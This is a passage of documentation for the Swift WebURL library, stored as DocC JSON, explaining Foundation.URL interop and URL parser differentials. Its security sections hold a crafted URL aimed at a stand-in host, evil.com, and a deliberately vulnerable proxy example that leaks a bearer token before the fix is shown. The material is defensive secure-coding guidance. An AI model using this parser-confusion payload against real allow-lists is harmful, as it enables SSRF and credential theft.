{"metadata":{"role":"article","title":"Using WebURL with Foundation","modules":[{"name":"WebURL"}],"roleHeading":"Article"},"sections":[],"primaryContentSections":[{"kind":"content","content":[{"type":"heading","anchor":"Introduction","text":"Introduction","level":2},{"type":"paragraph","inlineContent":[{"text":"The WebURL package comes with a number of APIs to support using ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" values with Foundation:","type":"text"}]},{"type":"orderedList","items":[{"content":[{"inlineContent":[{"type":"text","text":"Conversion initializers."}],"type":"paragraph"},{"inlineContent":[{"text":"Convert values between ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" and ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" simply by constructing the type you need.","type":"text"},{"text":" ","type":"text"},{"text":"These initializers verify that both types have an equivalent interpretation of the URL value.","type":"text"}],"type":"paragraph"},{"syntax":"swift","code":["let sourceURL = WebURL(\"https:\/\/api.example.com\/foo\/bar?baz\")!","","\/\/ WebURL -> Foundation.URL","let nsURL = URL(sourceURL)  \/\/ ✅ \"https:\/\/api.example.com\/foo\/bar?baz\"    ","\/\/ Foundation.URL -> WebURL","let webURL = WebURL(nsURL)  \/\/ ✅ \"https:\/\/api.example.com\/foo\/bar?baz\""],"type":"codeListing"}]},{"content":[{"inlineContent":[{"text":"Convenience wrappers.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"text":"Make requests using ","type":"text"},{"code":"URLSession","type":"codeVoice"},{"text":" directly from a ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" value, eliminating the conversion boilerplate.","type":"text"}],"type":"paragraph"},{"code":["\/\/ 😌 Make a URLSession request using a WebURL.","let webURL = WebURL(\"https:\/\/api.example.com\/foo\/bar?baz\")!","let dataTask = URLSession.shared.dataTask(with: webURL) { data, response, error in","  \/\/ ...","}","dataTask.resume()"],"type":"codeListing","syntax":"swift"}]}]},{"name":"Note","type":"aside","style":"note","content":[{"inlineContent":[{"text":"","type":"text"},{"text":" ","type":"text"},{"text":"For these APIs to be available, you must import the ","type":"text"},{"code":"WebURLFoundationExtras","type":"codeVoice"},{"text":" module:","type":"text"}],"type":"paragraph"},{"code":["import Foundation","import WebURL","import WebURLFoundationExtras  \/\/ <--"],"syntax":"swift","type":"codeListing"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"These APIs enable you to use "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" for more of your URL processing, while still supporting clients"},{"type":"text","text":" "},{"type":"text","text":"or using libraries which require "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":"."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"For many applications, this will “just work”. However, there are some subtleties you should"},{"type":"text","text":" "},{"type":"text","text":"generally be aware of. The issues we will be discussing are, in fact, defects in URLs themselves;"},{"type":"text","text":" "},{"type":"text","text":"and they happen in every programming language, with every URL library, and can affect the security"},{"type":"text","text":" "},{"type":"text","text":"and robustness of your code."}]},{"type":"heading","anchor":"URL-Strings-are-Ambiguous","text":"URL Strings are Ambiguous","level":2},{"type":"paragraph","inlineContent":[{"text":"Almost all systems rely on URLs, often for vital communication with both local and remote services,","type":"text"},{"text":" ","type":"text"},{"text":"or processing requests from other devices; and data extracted from URLs is often used to make security-","type":"text"},{"text":" ","type":"text"},{"text":"and privacy-sensitive decisions. It may be surprising, then, to learn that ","type":"text"},{"type":"strong","inlineContent":[{"type":"text","text":"URL strings are ambiguous"}]},{"text":".","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"URL standards have been revised many times over the decades, resulting in incompatibilities."},{"type":"text","text":" "},{"type":"text","text":"It is difficult to ensure that all code which processes a URL string interprets it in exactly the same way and"},{"type":"text","text":" "},{"type":"text","text":"derives the same information from it. That is particularly true of networked clients, each of which might"},{"type":"text","text":" "},{"type":"text","text":"use entirely different languages and libraries to process URLs, but even local applications"},{"type":"text","text":" "},{"type":"text","text":"might expose data to multiple URL parsers, perhaps in dependencies of dependencies."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Moreover, web browsers (typically one of the most important clients) have not been able to conform to "},{"type":"emphasis","inlineContent":[{"text":"any","type":"text"}]},{"type":"text","text":""},{"type":"text","text":" "},{"type":"text","text":"historical standards because they must maintain compatibility with the web. The result is a surprising amount"},{"type":"text","text":" "},{"type":"text","text":"of variety in how URL strings are actually interpreted, and occasional disagreements;"},{"type":"text","text":" "},{"type":"text","text":"and given how much we rely on URLs, that can lead to unexpected behavior and even exploitable vulnerabilities."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Enter "},{"inlineContent":[{"text":"WebURL","type":"text"}],"type":"strong"},{"type":"text","text":". WebURL conforms to the latest industry standard, which formally defines URL parsing"},{"type":"text","text":" "},{"type":"text","text":"in a way that is compatible with the web platform. You should expect "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" to work exactly as your browser does."},{"type":"text","text":" "},{"type":"text","text":"There is even a shared test-suite between "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":", the major browsers, and other library implementations,"},{"type":"text","text":" "},{"type":"text","text":"to help ensure consistency."}]},{"type":"paragraph","inlineContent":[{"text":"So what kind of disagreements and vulnerabilities are we talking about? Consider the following:","type":"text"}]},{"syntax":"swift","type":"codeListing","code":["\/\/ Q: What is the hostname of this URL?","let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","WebURL(urlString)!.hostname  \/\/ \"example.com\"","URL(string: urlString)!.host \/\/ \"evil.com\""]},{"type":"paragraph","inlineContent":[{"text":"Chrome, Safari, Firefox, Go, Python, NodeJS, and Rust all agree with WebURL - that this identifier","type":"text"},{"text":" ","type":"text"},{"text":"points to ","type":"text"},{"code":"\"example.com\"","type":"codeVoice"},{"text":". If you paste it in your browser, that’s where it will go.","type":"text"},{"text":" ","type":"text"},{"text":"But since Foundation’s interpretation is based on an obsolete standard that is not web-compatible,","type":"text"},{"text":" ","type":"text"},{"text":"it would send a request to ","type":"text"},{"code":"\"evil.com\"","type":"codeVoice"},{"text":" instead.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"These are the sorts of differences we’re talking about - “regular” URLs work like you’d expect, of course","type":"text"},{"text":" ","type":"text"},{"text":"(again - WebURL works just like your browser; ","type":"text"},{"inlineContent":[{"type":"text","text":"adopting WebURL won’t break everything"}],"type":"strong"},{"text":"), but there are these","type":"text"},{"text":" ","type":"text"},{"text":"little details which can and have been exploited by attackers in surprising ways. And as you can see,","type":"text"},{"text":" ","type":"text"},{"text":"generally WebURL’s interpretation is the more compatible one, because it matches the web.","type":"text"}]},{"name":"Important","type":"aside","style":"important","content":[{"inlineContent":[{"type":"text","text":""}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"Using multiple URL standards safely is a difficult problem, but in a sense it’s a problem we already live with."},{"type":"text","text":" "},{"type":"text","text":"We’ve devised a few simple guidelines to help your code deal with this situation more robustly:"}],"type":"paragraph"},{"type":"unorderedList","items":[{"content":[{"inlineContent":[{"text":"Store and communicate URLs using URL types. Avoid passing them around as strings.","type":"text"}],"type":"paragraph"}]},{"content":[{"inlineContent":[{"type":"text","text":"Each URL string should be interpreted by "},{"inlineContent":[{"text":"only one","type":"text"}],"type":"strong"},{"type":"text","text":" parser."}],"type":"paragraph"}]},{"content":[{"inlineContent":[{"type":"text","text":"If you must store or communicate a URL as a string (e.g. in JSON),"},{"type":"text","text":" "},{"type":"text","text":"document which parser should be used to interpret it."}],"type":"paragraph"}]},{"content":[{"inlineContent":[{"type":"text","text":"If no parser is specified, "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" is a good default."}],"type":"paragraph"}]}]},{"inlineContent":[{"type":"text","text":"The lack of alignment in URL standards is an issue that is being actively exploited, particularly in"},{"type":"text","text":" "},{"type":"text","text":"Server-Side Request Forgery (SSRF) vulnerabilities. In the following sections, we’ll discuss the above advice"},{"type":"text","text":" "},{"type":"text","text":"in more detail, including examples of actual exploits and how these practices could have avoided them."}],"type":"paragraph"}]},{"type":"heading","anchor":"URL-Types-are-Unambiguous","text":"URL Types are Unambiguous","level":2},{"type":"paragraph","inlineContent":[{"type":"text","text":"The first guideline is to prefer storing and communicating URLs using URL types, rather than as strings."},{"type":"text","text":" "},{"type":"text","text":"The meaning of a plain string can be ambiguous, but a value with a type such as "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" or "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" "},{"type":"text","text":"communicates precisely how it should be interpreted, and this enables initializers which verify that semantics"},{"type":"text","text":" "},{"type":"text","text":"are maintained across a conversion."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"For example, consider the demonstration URL from the previous section. Both "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" and "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" were able"},{"type":"text","text":" "},{"type":"text","text":"to parse the raw URL string, but saw different components from it. Now, let’s try parsing the string as a"},{"type":"text","text":" "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":", and converting it to a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":":"}]},{"syntax":"swift","type":"codeListing","code":["let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","let nsURL = URL(string: urlString)!","print(nsURL.host) \/\/ \"evil.com\"","WebURL(nsURL)     \/\/ ✅ nil - URL is ambiguous"]},{"type":"paragraph","inlineContent":[{"text":"The initializer checks that both types agree about what the URL means. In this case, they don’t,","type":"text"},{"text":" ","type":"text"},{"text":"so the conversion fails. This is a ","type":"text"},{"inlineContent":[{"text":"much better outcome","type":"text"}],"type":"strong"},{"text":" than accidentally sending data to the wrong server!","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Something interesting happens if we try this conversion the other way around. Parsing a URL string with "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" "},{"type":"text","text":"also "},{"inlineContent":[{"type":"text","text":"normalizes"}],"type":"emphasis"},{"type":"text","text":" it, so it cleans up ambiguous syntax and makes the web-compatible interpretation more obvious"},{"type":"text","text":" "},{"type":"text","text":"to other software and systems. This means that converting a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" will almost always succeed,"},{"type":"text","text":" "},{"type":"text","text":"even in cases where the reverse order of operations would have failed."}]},{"type":"codeListing","code":["let urlString = \"http:\/\/foo@evil.com:80@example.com\/\" ","","let webURL = WebURL(urlString)!","print(webURL.hostname)  \/\/ \"example.com\"","print(webURL)           \/\/ \"http:\/\/foo%40evil.com:80@example.com\/\"","\/\/                                    ^^^","\/\/               Problematic '@' sign has been encoded by WebURL,","\/\/                  making the web-compatible interpretation","\/\/                                more obvious.","","URL(webURL)?.host  \/\/ ✅ \"example.com\""],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"type":"text","text":"Successful conversion does "},{"type":"strong","inlineContent":[{"type":"text","text":"not"}]},{"type":"text","text":" necessarily mean that the URLs have identical strings or components."},{"type":"text","text":" "},{"type":"text","text":"The conversion initializers are based on careful study of both standards, and although they are careful"},{"type":"text","text":" "},{"type":"text","text":"not to permit different interpretations, they are lenient in certain cases when both standards allow it."}]},{"type":"paragraph","inlineContent":[{"text":"That means they won’t get in your way rejecting irrelevant differences (many times, even a force-unwrap","type":"text"},{"text":" ","type":"text"},{"text":"would not be unreasonable), but they still catch those edge cases where there are genuine mismatches,","type":"text"},{"text":" ","type":"text"},{"text":"as we’ve seen in the previous few examples.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"Here is an example of the kind of differences that are allowed. The standard used by ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" requires","type":"text"},{"text":" ","type":"text"},{"text":"that the URL’s scheme and hostname be normalized to lowercase (","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" has to do it; it has no choice).","type":"text"},{"text":" ","type":"text"},{"text":"Luckily, RFC-2396 (the standard used by ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":") explicitly allows that, so even if those parts","type":"text"},{"text":" ","type":"text"},{"text":"of the URL are upper\/mixed-case (perhaps the user had caps-lock on and didn’t notice), the conversion is allowed.","type":"text"}]},{"type":"codeListing","code":["\/\/ Foundation's components:","let nsURL = URL(string: \"HTTP:\/\/EXAMPLE.COM\/\")!","print(nsURL)         \/\/ \"HTTP:\/\/EXAMPLE.COM\/\"","print(nsURL.scheme)  \/\/ \"HTTP\"","print(nsURL.host)    \/\/ \"EXAMPLE.COM\"","","\/\/ WebURL normalizes the URL, but the meaning is preserved:","let convertedURL = WebURL(nsURL)!","print(convertedURL)           \/\/ ✅ \"http:\/\/example.com\/\"","print(convertedURL.scheme)    \/\/ ✅ \"http\"","print(convertedURL.hostname)  \/\/ ✅ \"example.com\""],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"text":"This safe interoperability, which allows as much as it can but also catches real ambiguities, is only possible","type":"text"},{"text":" ","type":"text"},{"text":"because we are converting URL types rather than simply parsing the string again. In the next section, we’ll discuss","type":"text"},{"text":" ","type":"text"},{"text":"applying this idea throughout your application, so it is always clear how a URL is being interpreted.","type":"text"}]},{"type":"heading","level":2,"anchor":"One-Parser-Per-String","text":"One Parser Per String"},{"type":"paragraph","inlineContent":[{"text":"Consider the following program, demonstrating a simple proxy server. Here’s how it works:","type":"text"}]},{"type":"unorderedList","items":[{"content":[{"inlineContent":[{"text":"0️⃣ (Not shown) A client connects to us, says “make a request to this URL for me, please”.","type":"text"}],"type":"paragraph"}]},{"content":[{"inlineContent":[{"type":"text","text":"1️⃣ The server checks the provided URL."}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"text":"2️⃣ If the hostname is allowed, the server makes the request, including some private token\/key in the header.","type":"text"}]}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"3️⃣ (Not shown) The response is forwarded to the client."}]}]}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"The part we’re interested in is split in to two functions - one gets a URL string and checks that it points"},{"type":"text","text":" "},{"type":"text","text":"to an approved server, and the other makes the authenticated HTTP request:"}]},{"type":"paragraph","inlineContent":[{"type":"strong","inlineContent":[{"type":"text","text":"Application:"}]}]},{"type":"codeListing","code":["func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","  \/\/ 1. Verify host.","  guard checkHostIsAllowed(urlString) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ 2. Make request.","  return try makeAuthenticatedRequest(urlString, completionHandler: ...)","}"],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"type":"strong","inlineContent":[{"type":"text","text":"Allow-List Checker:"}]}]},{"type":"codeListing","code":["let allowedHosts: Set<String> = [ \"example.com\", \/* ... *\/ ]","","func checkHostIsAllowed(_ urlString: \/* ⚠️ *\/ String) -> Bool {","  if let hostname = WebURL(urlString)?.hostname {","    return allowedHosts.contains(hostname)","  }","  return false","}"],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"inlineContent":[{"type":"text","text":"Request Engine:"}],"type":"strong"}]},{"type":"codeListing","code":["func makeAuthenticatedRequest(_ urlString: \/* ⚠️ *\/ String, completionHandler: <...>) throws -> URLSessionDataTask {","  guard let url = Foundation.URL(string: urlString) else {","    throw MyLibraryError.invalidURL","  }","  var request = URLRequest(url: url)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"text":"Each of these functions is reasonable by itself, but the effect of combining them is that a single URL string","type":"text"},{"text":" ","type":"text"},{"text":"is parsed ","type":"text"},{"type":"strong","inlineContent":[{"text":"twice","type":"text"}]},{"text":", each time by a different parser, and the results may not be consistent. In other words,","type":"text"},{"text":" ","type":"text"},{"text":"the hostname verified by ","type":"text"},{"code":"checkHostIsAllowed","type":"codeVoice"},{"text":" might ","type":"text"},{"type":"emphasis","inlineContent":[{"text":"not","type":"text"}]},{"text":" be the host that ","type":"text"},{"code":"makeAuthenticatedRequest","type":"codeVoice"},{"text":" actually","type":"text"},{"text":" ","type":"text"},{"text":"makes a request to! 😱","type":"text"}]},{"type":"codeListing","code":["\/\/ The call:","let task = try checkHostAndMakeRequest(\"http:\/\/foo@evil.com:80@example.com\/\")","","\/\/ What happens:","func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","","  \/\/ ⚠️ 'checkHostIsAllowed' parses the string using WebURL,","  \/\/     so it thinks the host is 'example.com'.","  guard checkHostIsAllowed(urlString) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ ⚠️ But the request function parses the string using Foundation.URL,","  \/\/    so it actually makes the request to 'evil.com' and leaks our token!","  return try makeAuthenticatedRequest(urlString, completionHandler: ...)","}"],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"type":"text","text":"A maliciously-crafted string could exploit this difference to leak authentication tokens to the attacker’s own server;"},{"type":"text","text":" "},{"type":"text","text":"in fact, this demonstrates "},{"isActive":true,"type":"reference","identifier":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/"},{"type":"text","text":" that was used to gain unauthorized access to internal"},{"type":"text","text":" "},{"type":"text","text":"Google Cloud Platform accounts. Differences between modern and historic URL standards can cause security vulnerabilities,"},{"type":"text","text":" "},{"type":"text","text":"even outside the Swift ecosystem. It’s not just a Foundation.URL or WebURL thing - it’s something "},{"type":"strong","inlineContent":[{"text":"all developers","type":"text"}]},{"type":"text","text":" "},{"type":"text","text":"need to be aware of. URL libraries often do not align to the same standard, and any data derived from one parser"},{"type":"text","text":" "},{"type":"text","text":"might be inconsistent with another parser."}]},{"type":"paragraph","inlineContent":[{"text":"Spotting these interactions can be difficult - for instance, the functions may live in separate libraries","type":"text"},{"text":" ","type":"text"},{"text":"and you may not have access to their source code, or the URL string might be in a JSON document or XPC message.","type":"text"},{"text":" ","type":"text"},{"text":"The common feature is that URLs are communicated ","type":"text"},{"inlineContent":[{"type":"text","text":"without using a URL type"}],"type":"strong"},{"text":", so we can’t ensure that everybody","type":"text"},{"text":" ","type":"text"},{"text":"who sees the string interprets it the same way.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"We can fix the issue in this case by hoisting URL parsing out of "},{"type":"codeVoice","code":"checkHostIsAllowed"},{"type":"text","text":" and "},{"type":"codeVoice","code":"makeAuthenticatedRequest"},{"type":"text","text":","},{"type":"text","text":" "},{"type":"text","text":"and moving it in to the caller. Now, instead of passing strings around and letting each function choose its own"},{"type":"text","text":" "},{"type":"text","text":"parser, the caller parses the string, and passes around strongly-typed URL values (in this case "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":")."},{"type":"text","text":" "},{"type":"text","text":"Thanks to checked conversions, the receivers can safely convert to another URL type if they wish - in this case,"},{"type":"text","text":" "},{"type":"codeVoice","code":"makeAuthenticatedRequest"},{"type":"text","text":" converts to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" and makes the request using "},{"type":"codeVoice","code":"URLSession"},{"type":"text","text":"."}]},{"type":"paragraph","inlineContent":[{"inlineContent":[{"type":"text","text":"Fixed Allow-List Checker and Request Engine:"}],"type":"strong"}]},{"type":"codeListing","code":["func checkHostIsAllowed(_ url: \/* ✅ *\/ WebURL) -> Bool {","  if let hostname = url.hostname {","    return allowedHosts.contains(hostname)","  }","  return false","}","","func makeAuthenticatedRequest(_ url: \/* ✅ *\/ WebURL, completionHandler: <...>) throws -> URLSessionDataTask {","  \/\/ ✅ checked WebURL -> Foundation.URL conversion.","  guard let convertedURL = Foundation.URL(url) else {","    throw MyLibraryError.invalidURL","  }","  var request = URLRequest(url: convertedURL)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"],"syntax":"swift"},{"type":"aside","style":"tip","name":"Tip","content":[{"inlineContent":[{"type":"text","text":""}],"type":"paragraph"},{"inlineContent":[{"type":"text","text":"We’re showing the explicit "},{"type":"codeVoice","code":"WebURL -> Foundation.URL"},{"type":"text","text":" conversions for clarity, but WebURL also"},{"type":"text","text":" "},{"type":"text","text":"includes convenience APIs so you can create "},{"type":"codeVoice","code":"URLRequest"},{"type":"text","text":"s directly."}],"type":"paragraph"},{"syntax":"swift","code":["func makeAuthenticatedRequest(_ url: WebURL, completionHandler: <...>) throws -> URLSessionDataTask {","  \/\/ ✅ Create URLRequest directly from a WebURL","  var request = URLRequest(url: url)","  request.allHTTPHeaderFields = [\"Authorization\" : \"Bearer <...>\"]","  return URLSession.shared.dataTask(with: request, completionHandler: completionHandler)","}"],"type":"codeListing"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Let’s see what happens now that we’ve switched to using URL types rather than strings:"}]},{"type":"codeListing","code":["\/\/ The call:","let task = try checkHostAndMakeRequest(\"http:\/\/foo@evil.com:80@example.com\/\")","","\/\/ What happens:","func checkHostAndMakeRequest(_ urlString: String) throws -> URLSessionDataTask {","","  \/\/ ✅ The string is only parsed once.","  guard let url = WebURL(urlString) else {","    throw MyAppError.invalidURL","  }","  \/\/ ✅ 'checkHostIsAllowed' reads the host as 'example.com'.","  guard checkHostIsAllowed(url) else { ","    throw MyAppError.hostIsNotAllowed","  }","  \/\/ ✅ Typed conversion ensures the request is really made to 'example.com' ","  return try makeAuthenticatedRequest(url, completionHandler: ...)","}"],"syntax":"swift"},{"type":"paragraph","inlineContent":[{"text":"We could even hoist URL parsing again, and make ","type":"text"},{"type":"codeVoice","code":"checkHostAndMakeRequest"},{"text":" itself accept a URL value","type":"text"},{"text":" ","type":"text"},{"text":"instead of a string. By applying this process repeatedly, we reduce the number of raw URL strings","type":"text"},{"text":" ","type":"text"},{"text":"floating around the application, and can leverage the type system to ensure we always interpret values","type":"text"},{"text":" ","type":"text"},{"text":"correctly.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"As we’ve seen, there can be subtle, security-sensitive interactions between URL parsers, but by applying","type":"text"},{"text":" ","type":"text"},{"text":"some reasonable best-practices, we can get what we want: web-compatible URL parsing and operations","type":"text"},{"text":" ","type":"text"},{"text":"(notice the request is made to ","type":"text"},{"type":"codeVoice","code":"\"example.com\""},{"text":", not ","type":"text"},{"type":"codeVoice","code":"\"evil.com\""},{"text":"), with robustly Foundation interop.","type":"text"},{"text":" ","type":"text"},{"text":"The guiding rule is that each ","type":"text"},{"inlineContent":[{"type":"text","text":"string"}],"type":"emphasis"},{"text":" should be parsed by only one parser.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"For this reason, we "},{"type":"strong","inlineContent":[{"type":"text","text":"strongly recommend"}]},{"type":"text","text":" that you use typed URL values and the conversion initializers"},{"type":"text","text":" "},{"type":"text","text":"provided by "},{"type":"codeVoice","code":"WebURLFoundationExtras"},{"type":"text","text":". For more complex situations, such as URLs in JSON documents or XPC messages,"},{"type":"text","text":" "},{"type":"text","text":"document which parser should be used, and parse those values early or hide them behind typed APIs,"},{"type":"text","text":" "},{"type":"text","text":"so they do not spread as plain strings."}]},{"type":"heading","level":2,"anchor":"Prefer-Parsing-Using-WebURL","text":"Prefer Parsing Using WebURL"},{"type":"paragraph","inlineContent":[{"text":"We’ve discussed how you can use the type system to ensure safe conversions, but what about the initial step?","type":"text"},{"text":" ","type":"text"},{"text":"Which URL parser should you use to turn your strings in to objects?","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Firstly, if the developer has specified which parser to use for a URL string, "},{"type":"strong","inlineContent":[{"type":"text","text":"use that parser"}]},{"type":"text","text":"."},{"type":"text","text":" "},{"type":"text","text":"Otherwise, matching a web browser is generally a good choice, and probably a more reasonable choice"},{"type":"text","text":" "},{"type":"text","text":"than the standard used by "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":", which has been officially obsolete for several decades."}]},{"type":"aside","style":"tip","name":"Tip","content":[{"inlineContent":[{"type":"text","text":""},{"type":"text","text":" "},{"type":"text","text":"I know, this could all sound a bit scary; it’s complexity you didn’t ask for and would much rather do without."},{"type":"text","text":" "},{"type":"text","text":"I get it. But I hope this document has helped to illustrate that the status quo has serious problems,"},{"type":"text","text":" "},{"type":"text","text":"and the complexity, annoying as it is, can be managed very well with some simple best-practices."}],"type":"paragraph"}]},{"type":"paragraph","inlineContent":[{"text":"Using ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" for parsing and URL manipulation comes with a lot of additional benefits:","type":"text"}]},{"type":"orderedList","items":[{"content":[{"type":"paragraph","inlineContent":[{"text":"🌍 It’s web-compatible.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Actors on the web platform should use a web-compatible parser to interpret URLs."},{"type":"text","text":" "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" is not web-compatible. It’s as simple as that."}]},{"type":"paragraph","inlineContent":[{"text":"WebURL behaves just like a browser does, just like JavaScript’s ","type":"text"},{"code":"URL","type":"codeVoice"},{"text":" class does, and like many other libraries do.","type":"text"},{"text":" ","type":"text"},{"text":"In fact, the ","type":"text"},{"identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/jsModel-swift.property","type":"reference","isActive":true},{"text":" property exposes the exact JS URL API for mixed Swift\/JS","type":"text"},{"text":" ","type":"text"},{"text":"code-bases - tested to browser standards, using the same shared test suite that the major browsers use.","type":"text"}]}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"🔩 It’s always normalized."}]},{"type":"paragraph","inlineContent":[{"text":"Parsing a string using ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" cleans up a lot of ambiguous or ill-formatted URLs automatically.","type":"text"},{"text":" ","type":"text"},{"text":"That means ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" is easier to work with, and produces URL strings which are more interoperable","type":"text"},{"text":" ","type":"text"},{"text":"with other libraries and systems.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"For example, when ","type":"text"},{"code":"async-http-client","type":"codeVoice"},{"text":" needs to examine a scheme from a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":"","type":"text"},{"text":" ","type":"text"},{"text":"(like ","type":"text"},{"code":"\"http\"","type":"codeVoice"},{"text":" or ","type":"text"},{"code":"\"https+unix\"","type":"codeVoice"},{"text":"), it has to remember to manually normalize it to lowercase it first -","type":"text"},{"text":" ","type":"text"},{"text":"like it does ","type":"text"},{"isActive":true,"type":"reference","identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/DeconstructedURL.swift#L45"},{"text":" and again way over ","type":"text"},{"isActive":true,"type":"reference","identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/Scheme.swift#L42"},{"text":", in another file.","type":"text"},{"text":" ","type":"text"},{"text":"SwiftPM does the same thing ","type":"text"},{"isActive":true,"type":"reference","identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/PackageCollections%2BValidation.swift#L35"},{"text":" and ","type":"text"},{"isActive":true,"type":"reference","identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/Model\/Collection.swift#L116"},{"text":" and other places.","type":"text"}]},{"type":"paragraph","inlineContent":[{"text":"With WebURL, ","type":"text"},{"inlineContent":[{"type":"text","text":"none of that is necessary"}],"type":"strong"},{"text":" - that boilerplate can just go. Schemes, hostnames, paths, etc","type":"text"},{"text":" ","type":"text"},{"text":"are all normalized, all the time. Even if you modify the URL and set components - it is always normalized.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Your code becomes more predictable. For example, I noticed that some parts of DocC "},{"type":"reference","isActive":true,"identifier":"https:\/\/github.com\/apple\/swift-docc\/blob\/d94139a5e64e9ecf158214b1cded2a2880fc1b02\/Sources\/SwiftDocC\/Model\/TaskGroup.swift#L43-L44"},{"type":"text","text":" "},{"type":"text","text":"manually normalize schemes to lowercase - is it intentional or not? Who knows! Like most people,"},{"type":"text","text":" "},{"type":"text","text":"they’re probably unaware that URL schemes are case-insensitive. With WebURL, they wouldn’t need to worry about it;"},{"type":"text","text":" "},{"type":"text","text":"their code could remain straightforward but still be correct and consistent."}]}]},{"content":[{"type":"paragraph","inlineContent":[{"text":"😌 Rich, expressive APIs.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"‘s "},{"type":"codeVoice","code":".pathComponents"},{"type":"text","text":" and "},{"type":"codeVoice","code":".formParams"},{"type":"text","text":" properties give you efficient access to the URL’s path and query."},{"type":"text","text":" "},{"type":"text","text":"The "},{"type":"codeVoice","code":".pathComponents"},{"type":"text","text":" view conforms to "},{"type":"codeVoice","code":"BidirectionalCollection"},{"type":"text","text":", so you have immediate access to a huge number of"},{"type":"text","text":" "},{"type":"text","text":"features and algorithms - such as "},{"type":"codeVoice","code":"map"},{"type":"text","text":", "},{"type":"codeVoice","code":"filter"},{"type":"text","text":", and "},{"type":"codeVoice","code":"reduce"},{"type":"text","text":", not to mention slicing, such as "},{"type":"codeVoice","code":"dropLast()"},{"type":"text","text":"."},{"type":"text","text":" "},{"type":"text","text":"And you can even modify through this view, using indexes to perform complex operations super-efficiently."}]},{"syntax":"swift","code":["let url = WebURL(\"https:\/\/github.com\/karwa\/swift-url\/issues\/63\")!","if url.pathComponents.dropLast().last == \"issues\",","  let issueNumber = url.pathComponents.last.flatMap(Int.init) 